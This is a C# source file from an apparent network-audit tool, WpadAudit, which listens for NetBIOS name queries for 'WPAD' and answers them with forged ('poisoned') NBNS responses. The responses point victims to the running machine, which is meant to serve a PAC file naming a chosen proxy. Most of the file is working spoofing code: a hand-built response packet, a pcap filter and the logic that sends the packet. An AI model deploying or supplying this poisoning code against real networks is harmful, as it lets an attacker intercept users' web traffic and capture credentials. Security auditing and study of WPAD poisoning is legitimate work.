/* The MIT License (MIT)

Copyright (c) 2016 Darren Southern

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE. */

using PacketDotNet;
using SharpPcap;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace WpadAudit
{
    public class NetworkCapture : BaseWorker
    {
        private static readonly byte[] Response = { 0x0, 0x0,         // Transaction id bytes
                                                    0x85, 0x00,       // Flags 
                                                    0x00, 0x00,       // Questions
                                                    0x00, 0x01,       // Answer RRs
                                                    0x00, 0x00,       // Authoruty RRs
                                                    0x00, 0x00,       // Additional RRs                          
                                                    0x20,             // Start of answer
                                                    // Name
                                                    0x46, 0x48, 0x46, 0x41, 0x45, 0x42, 0x45, 0x45, 0x43, 0x41, 0x43,
                                                    0x41, 0x43, 0x41, 0x43, 0x41, 0x43, 0x41, 0x43, 0x41, 0x43, 0x41,
                                                    0x43, 0x41, 0x43, 0x41, 0x43, 0x41, 0x43, 0x41, 0x41, 0x41, 0x00,
                                                    0x00, 0x20,               // Type
                                                    0x00, 0x01,               // Class
                                                    0x00, 0x00, 0x00, 0xa5,   // Time to live
                                                    0x00, 0x06,               // Data length
                                                    0x00, 0x00,               // Name flags
                                                    0x00, 0x00, 0x00, 0x00 }; // Ip address bytes
        // Filter that is populated with the primary adapters mac address and the proxy server that is specified
        // in the pac file
        private const string CaptureFilter = "ether src {0} and udp port 137";
        private const string WpadHostName = "WPAD";
        private const int    NetbiosPort = 137;

        // IP Address of the proxy that will be specified in the pac file
        public  IPEndPoint              Proxy { get; set; }
        public  IPEndPoint              PacFileHost { get; set; }
        private ICaptureDevice          Device { get; set; }
        private CancellationTokenSource Cancel = new CancellationTokenSource();

        public NetworkCapture(int deviceNumber, int listenPort, IPEndPoint proxyServer)
        {
            this.Device = CaptureDeviceList.Instance[deviceNumber];
            this.PacFileHost = new IPEndPoint(GetDeviceIp(this.Device), listenPort);
            this.Proxy = proxyServer;                        
        }

        /// <summary>
        /// Retrieves a list of devices. 
        /// </summary>
        /// <returns></returns>
        public static IEnumerable<string> GetDevices()
        {			
			CaptureDeviceList devices = CaptureDeviceList.Instance;

            for( int index = 0; index < devices.Count; index++)
            {
                IPAddress ipAddress = GetDeviceIp(index, true);
                string temp = ipAddress == null ? "No ipv4 detected" : ipAddress.ToString();
                yield return string.Format("{0} - {1}", temp, devices[index].Description);
            }
        }

        /// <summary>
        /// Start the capture
        /// </summary>
        public override void DoWork()
        {
            try
            {
                // Start the capturing process            
                this.Device.Open(DeviceMode.Normal, Configuration.CaptureReadTimeout);

                Logger.AddToInfoView("Starting capture on {0}", GetDeviceIp(this.Device));

                PhysicalAddress captureAddress = Configuration.CaptureMacAddress == null ? this.Device.MacAddress : Configuration.CaptureMacAddress;

                this.Device.Filter = string.Format(CaptureFilter, captureAddress);
                
                Logger.AddToInfoView("Using pcap filter {0}\r\n", this.Device.Filter);

                RawCapture packet = null;

                for(;;)
                {
                    if (this.CheckForCancel())
                        return;

                    packet = this.Device.GetNextPacket();

                    if (packet != null)
                        this.ProcessPacket(packet);
                }       
            }
            // Don't let this interfere. Noticed that an exception will be thrown if microsoft message
            // analyzer is run
            catch(Exception ex)
            {
                Logger.AddToErrorView("NetworkCapture.Dowork", ex);
            } 
        }

        /// <summary>
        /// Stop the capture
        /// </summary>
        public override void CleanUp()
        {
            if (this.Device.Started)
            {
                Logger.AddToInfoView("Stopping the network capture");
                this.Device.StopCapture();
                this.Device.Close();
            }
        }

        /// <summary>
        /// Fires off on a seperate thread when a packet is available
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void ProcessPacket(RawCapture incoming)
        {
            try
            {                
                Packet packet = Packet.ParsePacket(LinkLayers.Ethernet, incoming.Data);
                EthernetPacket ethSrc = (EthernetPacket)packet.Extract(typeof(EthernetPacket));
                IPv4Packet ipSrc = (IPv4Packet)packet.Extract(typeof(IPv4Packet));

                if (ipSrc.Protocol == IPProtocolType.UDP)
                {
                    UdpPacket udpSrc = (UdpPacket)packet.Extract(typeof(UdpPacket));

                    // From RFC 1002 Section 4.2.1.1
                    // Need to grab the transaction id for the reply
                    UInt16 namedTrnId = BitConverter.ToUInt16(udpSrc.PayloadData, 0);
                    // Looking for Response = query(0), OpCode = Query(0)
                    // 11000000 00000000   
                    UInt16 flags = Utility.ReverseUInt16(BitConverter.ToUInt16(udpSrc.PayloadData, 2));
                    if ((flags & 0xc000) == 0)
                    {
                        // Grab the name and make sure it's WPAD
                        string name = Encoding.Default.GetString(udpSrc.PayloadData, 12, 34);
                        if (Utility.DecodeName(name) == WpadHostName)
                        {
							Logger.AddToInfoView("Received NBNS query for {0} from {1}", WpadHostName, ethSrc.SourceHwAddress);

                            UdpPacket udpDst = new UdpPacket(NetbiosPort, NetbiosPort);
                            udpDst.PayloadData = SetupResponse(namedTrnId, GetDeviceIp(this.Device));

                            IPv4Packet ipDst = new IPv4Packet(GetDeviceIp(this.Device), ipSrc.SourceAddress);
                            ipDst.PayloadPacket = udpDst;

                            udpDst.UpdateCalculatedValues();
                            udpDst.UpdateUDPChecksum();
                            ipDst.UpdateCalculatedValues();
                            ipDst.UpdateIPChecksum();

                            EthernetPacket ethDst = new EthernetPacket(this.Device.MacAddress, ethSrc.SourceHwAddress, EthernetPacketType.IpV4);
                            ethDst.PayloadPacket = ipDst;
                            ethDst.UpdateCalculatedValues();

                            Logger.AddToInfoView("Sending poisoned response for {0}", WpadHostName);
                            this.Device.SendPacket(ethDst.Bytes);
                        }
                    }
                }
                else if (ipSrc.Protocol == IPProtocolType.TCP)
                {                    
                    TcpPacket tcpSrc = (TcpPacket)packet.Extract(typeof(TcpPacket));
                    if (tcpSrc.Syn)                    
                        Logger.AddToInfoView("SYN sent {0}:{1}", ipSrc.DestinationAddress, tcpSrc.SourcePort);                                            
                }
            }
            catch(Exception ex)
            {
                Logger.AddToErrorView("OnPacketArrival", ex);
            }
        }

        /// <summary>
        /// Clones the baked repsponse array and poulates the transactionid from the request
        /// and the target ip
        /// </summary>
        /// <param name="transactionId"></param>
        /// <param name="target"></param>
        /// <returns></returns>
        private static byte[] SetupResponse(UInt16 transactionId, IPAddress target)
        {
            byte[] buffer = (byte[])Response.Clone();

            using (MemoryStream response = new MemoryStream(buffer, true))
            {
                BinaryWriter writer = new BinaryWriter(response);
                writer.Write(transactionId);
                writer.Seek(58, SeekOrigin.Begin);
                writer.Write(target.GetAddressBytes());
                writer.Flush();
            }

            return buffer;
        }

        /// <summary>
        /// Returns the ip address for the specified device
        /// </summary>
        /// <param name="deviceNumber"></param>
        /// <returns></returns>
        public static IPAddress GetDeviceIp(int deviceNumber, bool ignoreEmpty = false)
        {
            ICaptureDevice device = CaptureDeviceList.Instance[deviceNumber];
            return GetDeviceIp(device, ignoreEmpty);
        }
        /// <summary>
        /// Retrieves the ip address bound to the specified device
        /// </summary>
        /// <param name="device"></param>
        /// <returns></returns>
        private static IPAddress GetDeviceIp(ICaptureDevice device, bool ignoreEmpty = false )
        {
            try
            {
				NetworkInterface[] interfaces = NetworkInterface.GetAllNetworkInterfaces();

				foreach( NetworkInterface adapter in interfaces)
				{
					// Linux these will match, ie eth0 == eth0
                    // Windows look for the adapter id in the device description
                    if (device.Name == adapter.Name || device.Name.Contains(adapter.Id))
                    {
                        UnicastIPAddressInformation info = adapter.GetIPProperties().UnicastAddresses
                                                                  .Where(x => x.Address.AddressFamily == AddressFamily.InterNetwork)
                                                                  .FirstOrDefault();
						if( info != null )
                        	return info.Address;

						return null;
                    }
				}

                if( !ignoreEmpty )
                    throw new Exception(string.Format("Unable to determine an ipv4 for device {0}", device));

                return null;
            }
            catch( Exception ex)
            {
                Logger.AddToErrorView("GetDeviceIp", ex);
                throw ex;
            }            
        }      
    }
}